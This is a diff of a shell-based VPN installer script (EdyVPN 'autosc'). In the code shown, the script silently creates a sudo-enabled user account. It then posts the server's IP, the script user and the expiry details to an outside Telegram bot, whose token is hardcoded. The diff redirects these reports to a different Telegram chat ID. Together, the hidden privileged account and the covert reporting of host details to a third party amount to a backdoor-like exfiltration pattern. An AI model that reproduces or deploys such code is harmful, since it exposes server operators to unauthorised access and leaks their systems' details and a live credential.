@@ -1037,7 +1037,7 @@ domain=$(cat /etc/xray/domain)
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="-1002047467153"
+    CHATID="-1001843171201"
     KEY="6391322503:AAGk2hoKHtMC_DBF2kZJO1poCoNOmR-8AW0"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
@@ -1047,7 +1047,7 @@ domain=$(cat /etc/xray/domain)
     TIMEZONE=$(printf '%(%H:%M:%S)T')
     TEXT="
 <code>────────────────────</code>
-<b> ⚠️ AutoSC Free EdyVPN ⚠️ </b>
+<b> ⚠️ FREE AUTOSC EdyVPN ⚠️ </b>
 <code>────────────────────</code>
 <code>User   : </code><code>$USRSC</code>
 <code>Date   : </code><code>$TIMES</code>
@@ -1055,6 +1055,8 @@ domain=$(cat /etc/xray/domain)
 <code>Ip vps : </code><code>$MYIP</code>
 <code>Exp Sc : </code><code>$EXPSC</code>
 <code>Owner  : </code><code>@kangbacox</code>
+<code>────────────────────</code>
+<b> ⚠️ 2024 ALL IN OWO KUN ⚠️ </b>
 <code>────────────────────</code>
 <i>Automatic Notification from</i>
 <i>Edy Tunneling | @kangbacox</i>
